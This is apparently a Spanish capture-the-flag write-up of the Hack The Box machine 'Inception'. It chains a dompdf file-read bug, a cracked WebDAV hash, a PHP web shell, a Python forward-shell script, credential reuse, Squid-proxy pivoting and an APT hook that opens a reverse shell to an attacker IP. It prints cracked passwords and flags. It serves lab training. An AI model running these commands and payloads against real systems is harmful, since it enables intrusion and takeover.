---
layout: post
title: Inception
date: 2023-03-21
description:
img:
fig-caption:
tags: [eWPT, eCPPTv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Inception-htb/Inception.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de DomPDF

* LFI

* Abuso de Squid Proxy

* SSRF - Internal Port Discovery

* Abuso de WebDAV

* Python Scripting  [Nivel Básico]

* Pivoting

* Abuso de tarea CRON (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.67 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 11:12 GMT
Nmap scan report for 10.10.10.67
Host is up (0.12s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 27.06 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80,3128 10.10.10.67 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 11:14 GMT
Nmap scan report for 10.10.10.67
Host is up (0.20s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Inception
|_http-server-header: Apache/2.4.18 (Ubuntu)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.54 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.67
http://10.10.10.67 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.67], Script, Title[Inception]
```

Aplico fuzzing para descurbrir rutas

```null
gobuster dir -u http://10.10.10.67/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.67/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/21 11:37:31 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 299]
/assets               (Status: 301) [Size: 311] [--> http://10.10.10.67/assets/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.67/images/]
/dompdf               (Status: 301) [Size: 311] [--> http://10.10.10.67/dompdf/]
                                                                                
===============================================================
2023/03/21 11:37:48 Finished
===============================================================
```

Está accessible el DomPDF

```null
curl -s -X GET http://10.10.10.67/dompdf/ | html2text
****** Index of /dompdf ******
[[ICO]]       Name                         Last_modified    Size Description
============================================================================
[[PARENTDIR]] Parent_Directory                                -  
[[   ]]       CONTRIBUTING.md              2014-01-26 20:25 3.1K  
[[   ]]       LICENSE.LGPL                 2013-05-24 03:47  24K  
[[   ]]       README.md                    2014-02-07 03:30 4.8K  
[[   ]]       VERSION                      2014-02-07 06:35    5  
[[   ]]       composer.json                2014-02-02 08:33  559  
[[   ]]       dompdf.php                   2013-05-24 03:47 6.9K  
[[   ]]       dompdf_config.custom.inc.php 2013-11-07 04:45 1.2K  
[[   ]]       dompdf_config.inc.php        2017-11-06 02:21  13K  
[[DIR]]       include/                     2022-08-10 14:44    -  
[[DIR]]       lib/                         2022-08-10 14:44    -  
[[   ]]       load_font.php                2013-05-24 03:47 5.2K  
============================================================================
     Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80
```

Existen varias vulnerabilidades asociadas

```null
searchsploit dompdf
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                                                                                                           | php/webapps/33004.txt
dompdf 0.6.0 beta1 - Remote File Inclusion                                                                                                                                     | php/webapps/14851.txt
TYPO3 Extension ke DomPDF - Remote Code Execution                                                                                                                              | php/webapps/35443.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Consiste en un LFI

```null
Command line interface:
php dompdf.php
php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>

Web interface:

http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>


Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
```

Leo el ```/etc/passwd```

```null
curl -s -X GET 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd' | grep -oP '\[.*?\]' | grep -oP '\(.*?\)' | tr -d '()' | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```

La dirección IP del contenedor es ```192.168.0.10```

```null
curl -s -X GET 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie' | grep -oP '\[.*?\]' | grep -oP '\(.*?\)' | tr -d '()' | base64 -d | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | sort -u | grep 192
192.168.0.0
192.168.0.10
192.168.0.255
```

Desde el SQUID Proxy, listo los puertos internos abiertos

```null
 wfuzz -c --hc=503 -t 200 -z range,1-65535 -p 10.10.10.67:3128:HTTP http://localhost:FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://localhost:FUZZ/
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000022:   200        2 L      4 W        60 Ch       "22"                                                                                                                                            
000000080:   200        1051 L   169 W      2877 Ch     "80"                                                                                                                                            
000003128:   400        151 L    416 W      3521 Ch     "3128"
```

En el ```/etc/proxychains4.conf```, agrego un nuevo proxy HTTP, para poder pasar por el SQUID y tener conectividad con el SSH de la máquina

Veo el archivo de configuración del SQUID Proxy

```null
curl -s -X GET 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/squid/squid.conf' | grep -oP '\[.*?\]' | grep -oP '\(.*?\)' | tr -d '()' | base64 -d | grep -v "^#" | sed '/^\s*$/d'
acl localnet src 192.168.0.0/16
acl localnet_dst dst 192.168.0.0/16
acl localnet_dst dst 10.0.0.0/8
acl SSL_ports port 443
acl Safe_ports port 80		# http
acl Safe_ports port 21		# ftp
acl Safe_ports port 443		# https
acl Safe_ports port 70		# gopher
acl Safe_ports port 210		# wais
acl Safe_ports port 1025-65535	# unregistered ports
acl Safe_ports port 280		# http-mgmt
acl Safe_ports port 488		# gss-http
acl Safe_ports port 591		# filemaker
acl Safe_ports port 777		# multiling http
acl CONNECT method CONNECT
http_access allow localhost manager
http_access deny manager
http_access deny localnet_dst
http_access allow localnet
http_access allow localhost
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
refresh_pattern .		0	20%	4320
```

Lo mismo para el de ```apache2```

```null
curl -s -X GET 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf' | grep -oP '\[.*?\]' | grep -oP '\(.*?\)' | tr -d '()' | base64 -d | sed 's/^\s*//' | grep -v "^#" | sed '/^\s*$/d'
<VirtualHost *:80>
ServerAdmin webmaster@localhost
DocumentRoot /var/www/html
ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined
Alias /webdav_test_inception /var/www/html/webdav_test_inception
<Location /webdav_test_inception>
Options FollowSymLinks
DAV On
AuthType Basic
AuthName "webdav test credential"
AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
Require valid-user
</Location>
</VirtualHost>
```

Se leakea la ruta ```/webdav_test_inception```. Existe, pero requiere de autenticación

<img src="/writeups/assets/img/Inception-htb/1.png" alt="">

Pero también tengo la de configuración, ```/var/www/html/webdav_test_inception/webdav.passwd```. Contiene un hash

```null
curl -s -X GET 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd' | grep -oP '\[.*?\]' | grep -oP '\(.*?\)' | tr -d '()' | base64 -d | sed 's/^\s*//' | grep -v "^#" | sed '/^\s*$/d'
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```

La crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
babygurl69       (webdav_tester)     
1g 0:00:00:00 DONE (2023-03-21 12:43) 14.28g/s 329142p/s 329142c/s 329142C/s rossco..boobs1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

El protocolo ```webdav``` se utiliza para subir archivos. Con la herramienta ```davtest```, se pueden probar las diferentes extensiones

```null
davtest -url http://10.10.10.67/webdav_test_inception/ -auth webdav_tester:babygurl69
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.67/webdav_test_inception
********************************************************
NOTE	Random string for this session: 5d7NBz0M
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M
********************************************************
 Sending test files
PUT	shtml	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.shtml
PUT	jhtml	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.jhtml
PUT	cfm	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.cfm
PUT	txt	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.txt
PUT	pl	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.pl
PUT	cgi	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.cgi
PUT	aspx	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.aspx
PUT	asp	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.asp
PUT	php	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.php
PUT	jsp	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.jsp
PUT	html	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.html
********************************************************
 Checking for test file execution
EXEC	shtml	FAIL
EXEC	jhtml	FAIL
EXEC	cfm	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.txt
EXEC	txt	FAIL
EXEC	pl	FAIL
EXEC	cgi	FAIL
EXEC	aspx	FAIL
EXEC	asp	FAIL
EXEC	php	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.php
EXEC	php	FAIL
EXEC	jsp	FAIL
EXEC	html	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.html
EXEC	html	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.shtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.jhtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.cfm
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.txt
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.pl
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.cgi
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.aspx
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.asp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.php
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.jsp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.html
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.txt
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.php
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_5d7NBz0M/davtest_5d7NBz0M.html
```

Se puede subir y ejecutar PHP, por lo que creo mi archivo que me permita ejecutar comandos y lo subo al servidor

```null
<?php
  system($_REQUEST['cmd']);
?>
```

```null
curl -s -X PUT http://10.10.10.67/webdav_test_inception/cmd.php -d @cmd.php -H "Authorization: Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav_test_inception/cmd.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</address>
</body></html>
```

Puedo ejecutar comandos, pero no tengo conectividad con mi equipo

<img src="/writeups/assets/img/Inception-htb/2.png" alt="">

Creo una forward shell para trabajar más comodamente

```NULL
from base64 import b64encode
from random import randrange
import requests, sys, pdb, signal

def def_handler(sig, frame):
    print("\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.67/webdav_test_inception/cmd.php?cmd="
session = randrange(1, 9999)
stdin = "/dev/shm/strin.%s" % session
stdout = "/dev/shm/stdout.%s" % session

def RunCmd(command):

    headers = {
        'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'
    }

    command = b64encode(command.encode()).decode()

    post_data = {
        'cmd': 'echo %s | base64 -d | bash' % command
    }

    r = requests.post(main_url, data=post_data, headers=headers, timeout=2)

    return r.text


def WriteCmd(command):

    headers = {
        'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'
    }

    command = b64encode(command.encode()).decode()

    post_data = {
        'cmd': 'echo %s | base64 -d > %s' % (command, stdin)
    }

    r = requests.post(main_url, data=post_data, headers=headers, timeout=2)

    return r.text

def ReadCmd(command):

    ReadOutput = """/bin/cat %s""" % stdout

    response = RunCmd(ReadOutput)

    return response

def SetupShell():
    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)

    try:
        RunCmd(NamedPipes)
    except:
        None
    
    return None

SetupShell()

if __name__ == '__main__':

    while True:
        command = input("> ")
        
        WriteCmd(command + "\n")
        response = ReadCmd(command)
        print(response)

        ClearOutput = """echo '' > %s """ % stdout
        RunCmd(ClearOutput)
```

```null
rlwrap python3 forshell.py
> python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@Inception:/var/www/html/webdav_test_inception$ 
> 
zsh: suspended  rlwrap python3 forshell.py
❯ stty raw -echo; fg
[1]  + continued  rlwrap python3 forshell.py
> reset xterm
```

En un directorio hay un ```WordPress```

```null
> ls

ls
LICENSE.txt  assets  images	latest.tar.gz		wordpress_4.8.3
README.txt   dompdf  index.html  webdav_test_inception
```

El el ```wp-config.php``` hay credenciales en texto claro

```null
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');
```

Se reutiliza para el usuario ```cobb```

```null
su cobb
Password: 
> VwPddNh7xMZyDQoByQL4


cobb@Inception:/var/www/html/wordpress_4.8.3$ 
> 
```

Puedo ver la primera flag

```null
> cd

cd
cobb@Inception:~$ 
> cat user.txt

cat user.txt
0be56163ab56188aec34f9a8793c8d78
cobb@Inception:~$ 
> 
```

# Escalada

Tengo un privilegio a nivel de sudoers

```null
> sudo -l

sudo -l
[sudo] password for cobb: 
> VwPddNh7xMZyDQoByQL4


Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
cobb@Inception:/$ 
```

Puedo ejecutar cualquier comando como cualquier usuario. Me convierto en ```root```

```null
> sudo su

sudo su
root@Inception:/# 
> 
```

Pero no está en el directorio ```/root```

```null
> cd /root

cd /root
root@Inception:~# 
> ls

ls
root.txt
root@Inception:~# 
> cat root.txt

cat root.txt
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
root@Inception:~# 
> 
```

Me conecto por SSH a través del tunel del SQUID

```null
proxychains ssh cobb@localhost
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
cobb@localhost's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$ 
```

Para encontrar la flag, tengo que escapar del contenedor

```null
root@Inception:/home/cobb# hostname -I
192.168.0.10 
```

Subo el ```nmap``` al contenedor por SCP

```null
proxychains scp /opt/static-binaries/linux/nmap ssh cobb@localhost:/tmp/nmap
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
cobb@localhost's password: 
nmap                                                                                                                                                                          100% 5805KB   1.0MB/s   00:05    
scp: stat local "ssh": No such file or directory
```

Aplico HostDiscovery

```null
root@Inception:/tmp# ./nmap --min-rate 5000 -n -sn 192.168.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-21 17:05 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000038s latency).
MAC Address: FE:E4:8F:F2:7C:8C (Unknown)
Nmap scan report for 192.168.0.10
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 0.32 seconds
```

Escaneo todos los puertos para esa IP

```null
root@Inception:/tmp# ./nmap -p- --open --min-rate 5000 -n -Pn 192.168.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-21 17:06 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.0000090s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain
MAC Address: FE:E4:8F:F2:7C:8C (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 21.86 seconds
```

Me traigo el ```/etc/crontab```

```null
root@Inception:/tmp# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd etc
250 Directory successfully changed.
ftp> get crontab
local: crontab remote: crontab
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for crontab (826 bytes).
226 Transfer complete.
826 bytes received in 0.00 secs (5.5868 MB/s)
```

```null
root@Inception:/tmp# cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
30 23	* * *	root	apt upgrade -y 2>&1 >/dev/null
```

Se está ejecutando una actualización del sistema cada cinco minutos

Pero no tengo capacidad de escritura en el directorio de los archivos de configuración del APT

```null
root@Inception:/tmp# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb):     
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /etc/apt/apt.conf.d/
250 Directory successfully changed.
ftp> put crontab
local: crontab remote: crontab
200 PORT command successful. Consider using PASV.
550 Permission denied.
```

En cambio por ```tftp``` sí que puedo. Creo un archivo que se encargue de enviarme una reverse shell

```null
root@Inception:/tmp# cat << EOF > pwned
> APT::Update::Pre-Invoke {"bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'"};
> EOF
```

Lo subo al sistema

```null
root@Inception:/tmp# tftp 192.168.0.1
tftp> put pwned /etc/apt/apt.conf.d/pwned
Sent 80 bytes in 0.0 seconds
```

Puedo ver la segunda flag

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.67] 51584
bash: cannot set terminal process group (4661): Inappropriate ioctl for device
bash: no job control in this shell
root@Inception:/tmp# cat /root/root.txt
cat /root/root.txt
1b60c0f07fe4d143005262a7ee4e691e
root@Inception:/tmp# 
```